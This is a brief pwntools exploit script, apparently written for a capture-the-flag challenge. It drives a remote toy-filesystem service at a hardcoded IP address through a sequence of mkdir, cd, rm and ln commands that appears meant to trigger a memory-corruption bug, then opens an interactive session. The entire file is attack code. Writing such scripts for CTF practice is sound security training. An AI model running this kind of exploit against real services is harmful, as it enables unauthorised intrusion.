from pwn import *

HOST = ""
PORT = 1234
REMOTE = 0
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('13.125.131.113',PORT)

def cd(which):
    s.sendlineafter('$ ','cd {}'.format(which))

def touch(name):
    s.sendlineafter('$ ','touch {}'.format(name))

def mkfile(name,content):
    s.sendlineafter('$ ','mkfile {}'.format(name))
    s.sendlineafter('? ',content)

def mkdir(name):
    s.sendlineafter('$ ','mkdir {}'.format(name))

raw_input()
mkdir('padding')
mkdir('AAAA')
cd('AAAA')
mkdir('BBBB')
cd('..')
s.sendlineafter('$ ','rm AAAA')
s.sendlineafter('$ ','ln flag AAAA')
#s.sendlineafter('$ ','ln flag BBBB')
s.sendlineafter('$ ','rm AAAA')
#s.sendlineafter('$ ','ls')

s.interactive()

